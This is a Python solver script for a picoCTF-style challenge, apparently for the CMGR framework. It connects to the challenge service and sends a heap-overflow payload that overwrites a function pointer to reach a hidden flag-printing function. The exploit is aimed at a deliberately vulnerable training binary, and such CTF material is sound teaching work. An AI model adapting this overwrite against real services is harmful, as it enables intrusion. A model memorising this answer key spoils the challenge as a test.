#!/usr/bin/env python3
"""
CMGR Automated Solver for Digimon Digital Adventure
This solver is designed to work with the CMGR framework for picoCTF
"""

import struct
import sys
import socket
import os
import time

# Configuration
WARGREYMON_ADDR = 0x401316  # Address of wargreymon_appears() function

def create_payload():
    """
    Create the heap overflow payload to overwrite the function pointer.
    Total offset from name[0] to battle_function: 96 bytes
    """
    payload = b""
    payload += b"A" * 96  # Reach the function pointer (96 bytes)
    payload += struct.pack('<Q', WARGREYMON_ADDR)
    return payload

def solve():
    """
    Main solver function for CMGR
    Connects to the challenge instance and exploits it
    """
    # CMGR provides connection info via environment variables
    host = os.environ.get('CHAL_HOST', 'localhost')
    port = int(os.environ.get('CHAL_PORT', '9999'))

    print(f"[*] Connecting to {host}:{port}", file=sys.stderr)

    # Connect to the service
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    def recv_until(marker):
        """Receive data until marker is found"""
        data = b""
        while marker not in data:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
        return data

    def send_line(data):
        """Send a line of data"""
        sock.sendall(data + b"\n")
        time.sleep(0.1)  # Small delay for server processing

    try:
        # Wait for initial banner and menu
        print("[*] Waiting for initial banner...", file=sys.stderr)
        recv_until(b"Enter choice:")

        # Step 1: Name the Digimon
        print("[*] Step 1: Naming Digimon...", file=sys.stderr)
        send_line(b"1")
        recv_until(b"name:")
        send_line(b"Agumon")
        recv_until(b"Enter choice:")

        # Step 2: Train 10 times to reach 50+ experience
        print("[*] Step 2: Training to reach 50+ exp...", file=sys.stderr)
        for i in range(10):
            print(f"[*] Training session {i+1}/10", file=sys.stderr)
            send_line(b"2")
            recv_until(b"Enter choice:")

        # Step 3: Trigger digivolution with exploit payload
        print("[*] Step 3: Triggering digivolution with overflow...", file=sys.stderr)
        send_line(b"6")
        recv_until(b"new name:")

        payload = create_payload()
        send_line(payload)

        # Step 4: Receive flag
        print("[*] Step 4: Receiving flag...", file=sys.stderr)
        response = recv_until(b"picoCTF{")

        # Extract flag
        flag_start = response.find(b"picoCTF{")
        if flag_start == -1:
            print("[!] Flag not found in response", file=sys.stderr)
            return False

        flag_data = response[flag_start:]
        flag_end = flag_data.find(b"\n")
        if flag_end != -1:
            flag = flag_data[:flag_end].decode().strip()
        else:
            flag = flag_data.decode().strip()

        print(f"[+] Flag found: {flag}", file=sys.stderr)

        # Write flag to file for CMGR
        with open('flag', 'w') as f:
            f.write(flag)

        print("[+] Exploit successful!", file=sys.stderr)
        return True

    except Exception as e:
        print(f"[!] Error during exploitation: {e}", file=sys.stderr)
        return False
    finally:
        sock.close()

if __name__ == "__main__":
    try:
        success = solve()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"[!] Fatal error: {e}", file=sys.stderr)
        sys.exit(1)
